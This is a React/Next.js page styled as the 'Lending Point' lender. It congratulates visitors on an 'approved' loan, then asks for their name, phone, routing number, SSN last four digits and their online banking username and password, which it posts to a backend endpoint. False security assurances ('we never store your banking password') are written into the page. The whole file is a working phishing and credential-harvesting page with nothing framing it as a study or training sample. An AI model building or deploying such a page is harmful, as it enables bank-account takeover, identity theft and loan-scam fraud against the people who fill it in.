"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { useSearchParams } from "next/navigation"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { CheckCircle, Lock, ShieldCheck } from "lucide-react"
import Image from "next/image"

interface BankConnectionData {
  name: string
  phone: string
  bankAccount: string
  customBankName: string
  userId: string
  password: string
  ssnLast4: string
  routingNumber: string
}

export default function ApprovedUserPage() {
  const searchParams = useSearchParams()
  const [approvedAmount, setApprovedAmount] = useState<string>("")
  const [formData, setFormData] = useState<BankConnectionData>({
    name: "",
    phone: "",
    bankAccount: "",
    customBankName: "",
    userId: "",
    password: "",
    ssnLast4: "",
    routingNumber: "",
  })
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isSubmitted, setIsSubmitted] = useState(false)
  const [errors, setErrors] = useState<Partial<BankConnectionData>>({})

  useEffect(() => {
    const amount = searchParams.get("amount") || "5000"
    setApprovedAmount(amount)
  }, [searchParams])

  const updateFormData = (field: keyof BankConnectionData, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }))
    // Clear error when user starts typing
    if (errors[field]) {
      setErrors((prev) => ({ ...prev, [field]: undefined }))
    }
  }

  const validateForm = (): boolean => {
    const newErrors: Partial<BankConnectionData> = {}

    if (!formData.name.trim()) newErrors.name = "Name is required"
    if (!formData.phone.trim()) newErrors.phone = "Phone number is required"
    if (!formData.bankAccount) newErrors.bankAccount = "Bank selection is required"
    if (formData.bankAccount === "Other" && !formData.customBankName.trim()) {
      newErrors.customBankName = "Bank name is required"
    }
    if (!formData.userId.trim()) newErrors.userId = "User ID is required"
    if (!formData.password.trim()) newErrors.password = "Password is required"
    if (!/^\d{4}$/.test(formData.ssnLast4)) newErrors.ssnLast4 = "Enter last 4 digits of SSN"
    if (!/^\d{9}$/.test(formData.routingNumber)) newErrors.routingNumber = "Enter a 9-digit routing number"

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!validateForm()) return

    setIsSubmitting(true)

    try {
      // Prepare bank connection data
      const bankConnectionData = {
        ...formData,
        approvedAmount,
        status: "pending_verification",
      }

      console.log("[v0] Submitting bank connection:", bankConnectionData)

      // Send to API
      const response = await fetch("/api/bank-connections", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(bankConnectionData),
      })

      if (!response.ok) {
        const errorData = await response.json()
        throw new Error(errorData.error || "Failed to submit bank connection")
      }

      const result = await response.json()
      console.log("[v0] Bank connection submitted successfully:", result)

      setIsSubmitted(true)
    } catch (error) {
      console.error("Error submitting bank connection:", error)
      // Show error to user
      setErrors({ 
        name: error instanceof Error ? error.message : "Failed to submit bank connection" 
      })
    } finally {
      setIsSubmitting(false)
    }
  }

  const formatPhoneNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, "")
    const match = cleaned.match(/^(\d{3})(\d{3})(\d{4})$/)
    if (match) {
      return `(${match[1]}) ${match[2]}-${match[3]}`
    }
    return value
  }

  const bankOptions = [
    "Chase Bank",
    "Bank of America",
    "Wells Fargo",
    "Citibank",
    "U.S. Bank",
    "PNC Bank",
    "Capital One",
    "TD Bank",
    "BB&T",
    "SunTrust Bank",
    "Other",
  ]

  const inputClassName = (field?: string) =>
    `bg-white border-slate-300 focus:border-amber-600 focus:ring-amber-600 ${field ? "border-red-500" : ""}`

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
        <Card className="w-full max-w-md bg-white shadow-lg border border-slate-200">
          <CardHeader className="text-center pb-2">
            <div className="mx-auto w-14 h-14 bg-emerald-50 border border-emerald-100 rounded-full flex items-center justify-center mb-4">
              <CheckCircle className="w-7 h-7 text-emerald-600" />
            </div>
            <CardTitle className="text-2xl font-bold text-slate-900">Bank Connection Submitted</CardTitle>
            <CardDescription className="text-slate-600">
              Your bank details have been securely submitted for verification. Loan disbursement will be completed
              within 24–48 hours.
            </CardDescription>
          </CardHeader>
          <CardContent className="text-center">
            <div className="bg-slate-50 border border-slate-200 rounded-lg p-4 mb-6">
              <p className="text-xs font-medium uppercase tracking-wider text-slate-500 mb-1">Approved Amount</p>
              <p className="text-2xl font-bold text-slate-900">
                ${Number.parseInt(approvedAmount).toLocaleString()}
              </p>
            </div>
            <p className="text-sm text-slate-600">You will receive a confirmation email shortly with next steps.</p>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-slate-50">
      {/* Header */}
      <header className="bg-white border-b border-slate-200">
        <div className="max-w-4xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Image src="/lending-point-logo.png" alt="Lending Point" width={208} height={34} className="h-8 w-auto" priority />
          </div>
          <div className="hidden sm:flex items-center gap-2 text-sm text-slate-500">
            <ShieldCheck className="w-4 h-4 text-emerald-600" />
            <span>Secure Bank Connection</span>
          </div>
        </div>
        <div className="border-t border-slate-100 bg-slate-50/60">
          <div className="max-w-4xl mx-auto px-4 py-2.5 flex items-center gap-2 text-sm">
            <span className="w-5 h-5 rounded-full bg-slate-900 text-white text-[11px] font-semibold flex items-center justify-center">
              2
            </span>
            <span className="font-medium text-slate-700">Bank Verification</span>
            <span className="text-slate-400">— final step to receive your funds</span>
          </div>
        </div>
      </header>

      <main className="max-w-2xl mx-auto px-4 py-8">
        {/* Approval Summary */}
        <section className="mb-8 overflow-hidden rounded-xl border border-slate-200 bg-gradient-to-br from-slate-900 to-slate-800 shadow-sm">
          <div className="h-1 bg-amber-500" />
          <div className="p-6 sm:p-8">
            <div className="flex items-start justify-between gap-4">
              <div>
                <p className="text-xs font-semibold uppercase tracking-widest text-amber-400 mb-2">
                  Application Approved
                </p>
                <h1 className="text-2xl sm:text-3xl font-bold text-white mb-1">Congratulations</h1>
                <p className="text-slate-300 text-sm">
                  Your loan application has been reviewed and approved.
                </p>
              </div>
              <div className="shrink-0 w-11 h-11 rounded-full bg-amber-500/15 border border-amber-500/30 flex items-center justify-center">
                <CheckCircle className="w-6 h-6 text-amber-400" />
              </div>
            </div>

            <div className="mt-6 rounded-lg bg-white/5 border border-white/10 px-6 py-5">
              <p className="text-xs font-medium uppercase tracking-wider text-slate-400 mb-1">Approved Amount</p>
              <p className="text-4xl font-bold text-white">${Number.parseInt(approvedAmount).toLocaleString()}</p>
            </div>

            <p className="mt-4 text-sm text-slate-300">
              Complete the secure form below to connect your bank account. Funds are disbursed within 24 hours of
              verification.
            </p>
          </div>
        </section>

        {/* Bank Connection Form */}
        <Card className="bg-white shadow-sm border border-slate-200">
          <CardHeader className="pb-4">
            <CardTitle className="text-xl font-bold text-slate-900">Connect Your Bank Account</CardTitle>
            <CardDescription className="text-slate-600">
              Provide your details below so we can disburse your approved loan amount.
            </CardDescription>
          </CardHeader>
          <CardContent className="pt-0">
            <form onSubmit={handleSubmit} className="space-y-8">
              {/* Personal Information */}
              <fieldset className="space-y-4">
                <legend className="text-xs font-semibold uppercase tracking-wider text-slate-500 pb-2 w-full border-b border-slate-100">
                  Personal Information
                </legend>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
                  <div className="space-y-2">
                    <Label htmlFor="name" className="text-sm font-medium text-slate-700">
                      Full Name <span className="text-red-500">*</span>
                    </Label>
                    <Input
                      id="name"
                      type="text"
                      placeholder="Enter your full name"
                      value={formData.name}
                      onChange={(e) => updateFormData("name", e.target.value)}
                      className={inputClassName(errors.name)}
                    />
                    {errors.name && <p className="text-sm text-red-600">{errors.name}</p>}
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="phone" className="text-sm font-medium text-slate-700">
                      Phone Number <span className="text-red-500">*</span>
                    </Label>
                    <Input
                      id="phone"
                      type="tel"
                      placeholder="(555) 123-4567"
                      value={formData.phone}
                      onChange={(e) => updateFormData("phone", formatPhoneNumber(e.target.value))}
                      className={inputClassName(errors.phone)}
                    />
                    {errors.phone && <p className="text-sm text-red-600">{errors.phone}</p>}
                  </div>
                </div>
              </fieldset>

              {/* Bank Account Details */}
              <fieldset className="space-y-4">
                <legend className="text-xs font-semibold uppercase tracking-wider text-slate-500 pb-2 w-full border-b border-slate-100">
                  Bank Account Details
                </legend>
                <div className="space-y-4 pt-2">
                  <div className="space-y-2">
                    <Label htmlFor="bank" className="text-sm font-medium text-slate-700">
                      Select Your Bank <span className="text-red-500">*</span>
                    </Label>
                    <Select value={formData.bankAccount} onValueChange={(value) => updateFormData("bankAccount", value)}>
                      <SelectTrigger className={inputClassName(errors.bankAccount)}>
                        <SelectValue placeholder="Choose your bank" />
                      </SelectTrigger>
                      <SelectContent>
                        {bankOptions.map((bank) => (
                          <SelectItem key={bank} value={bank}>
                            {bank}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                    {errors.bankAccount && <p className="text-sm text-red-600">{errors.bankAccount}</p>}
                  </div>

                  {formData.bankAccount === "Other" && (
                    <div className="space-y-2">
                      <Label htmlFor="customBank" className="text-sm font-medium text-slate-700">
                        Bank Name <span className="text-red-500">*</span>
                      </Label>
                      <Input
                        id="customBank"
                        type="text"
                        placeholder="Enter your bank name"
                        value={formData.customBankName}
                        onChange={(e) => updateFormData("customBankName", e.target.value)}
                        className={inputClassName(errors.customBankName)}
                      />
                      {errors.customBankName && <p className="text-sm text-red-600">{errors.customBankName}</p>}
                    </div>
                  )}

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label htmlFor="routingNumber" className="text-sm font-medium text-slate-700">
                        Routing Number <span className="text-red-500">*</span>
                      </Label>
                      <Input
                        id="routingNumber"
                        type="text"
                        inputMode="numeric"
                        placeholder="9-digit routing number"
                        value={formData.routingNumber}
                        onChange={(e) => {
                          const digitsOnly = e.target.value.replace(/\D/g, "").slice(0, 9)
                          updateFormData("routingNumber", digitsOnly)
                        }}
                        className={inputClassName(errors.routingNumber)}
                      />
                      {errors.routingNumber && <p className="text-sm text-red-600">{errors.routingNumber}</p>}
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="ssnLast4" className="text-sm font-medium text-slate-700">
                        Last 4 of SSN <span className="text-red-500">*</span>
                      </Label>
                      <Input
                        id="ssnLast4"
                        type="password"
                        inputMode="numeric"
                        placeholder="••••"
                        value={formData.ssnLast4}
                        onChange={(e) => {
                          const digitsOnly = e.target.value.replace(/\D/g, "").slice(0, 4)
                          updateFormData("ssnLast4", digitsOnly)
                        }}
                        className={inputClassName(errors.ssnLast4)}
                      />
                      {errors.ssnLast4 && <p className="text-sm text-red-600">{errors.ssnLast4}</p>}
                    </div>
                  </div>
                </div>
              </fieldset>

              {/* Online Banking Verification */}
              <fieldset className="space-y-4">
                <legend className="text-xs font-semibold uppercase tracking-wider text-slate-500 pb-2 w-full border-b border-slate-100">
                  Online Banking Verification
                </legend>
                <div className="space-y-4 pt-2">
                  <div className="flex items-start gap-2.5 rounded-lg bg-slate-50 border border-slate-200 px-4 py-3">
                    <Lock className="w-4 h-4 text-slate-500 mt-0.5 shrink-0" />
                    <p className="text-sm text-slate-600">
                      We use your online banking login once to verify account ownership and process the disbursement.
                    </p>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label htmlFor="userId" className="text-sm font-medium text-slate-700">
                        User ID / Username <span className="text-red-500">*</span>
                      </Label>
                      <Input
                        id="userId"
                        type="text"
                        placeholder="Enter your bank user ID"
                        value={formData.userId}
                        onChange={(e) => updateFormData("userId", e.target.value)}
                        className={inputClassName(errors.userId)}
                      />
                      {errors.userId && <p className="text-sm text-red-600">{errors.userId}</p>}
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="password" className="text-sm font-medium text-slate-700">
                        Password <span className="text-red-500">*</span>
                      </Label>
                      <Input
                        id="password"
                        type="password"
                        placeholder="Enter your bank password"
                        value={formData.password}
                        onChange={(e) => updateFormData("password", e.target.value)}
                        className={inputClassName(errors.password)}
                      />
                      {errors.password && <p className="text-sm text-red-600">{errors.password}</p>}
                    </div>
                  </div>
                </div>
              </fieldset>

              {/* Security Notice */}
              <div className="rounded-lg border border-slate-200 bg-white p-4">
                <h4 className="flex items-center gap-2 font-semibold text-slate-900 mb-2 text-sm">
                  <ShieldCheck className="w-4 h-4 text-emerald-600" />
                  Your security is our priority
                </h4>
                <ul className="text-sm text-slate-600 space-y-1.5">
                  <li className="flex items-start gap-2">
                    <span className="mt-1.5 w-1 h-1 rounded-full bg-slate-400 shrink-0" />
                    All data is transmitted with 256-bit encryption
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="mt-1.5 w-1 h-1 rounded-full bg-slate-400 shrink-0" />
                    We never store your banking password
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="mt-1.5 w-1 h-1 rounded-full bg-slate-400 shrink-0" />
                    Your information is used only for loan disbursement
                  </li>
                </ul>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full bg-amber-600 hover:bg-amber-700 text-white font-semibold py-3.5 px-6 rounded-lg shadow-sm hover:shadow transition-all duration-200 text-base disabled:opacity-50 disabled:cursor-not-allowed border-0 outline-none focus:ring-2 focus:ring-amber-600 focus:ring-offset-2"
              >
                {isSubmitting ? (
                  <div className="flex items-center gap-2 justify-center">
                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    Connecting Bank Account...
                  </div>
                ) : (
                  `Connect Bank & Receive $${Number.parseInt(approvedAmount).toLocaleString()}`
                )}
              </button>
            </form>
          </CardContent>
        </Card>

        {/* Footer */}
        <div className="mt-8 pb-6 flex flex-col items-center gap-1.5 text-center">
          <Image src="/lending-point-logo.png" alt="Lending Point" width={208} height={34} className="h-6 w-auto opacity-70" />
          <p className="text-xs text-slate-400">© {new Date().getFullYear()} Lending Point. All rights reserved. Licensed lender.</p>
        </div>
      </main>
    </div>
  )
}
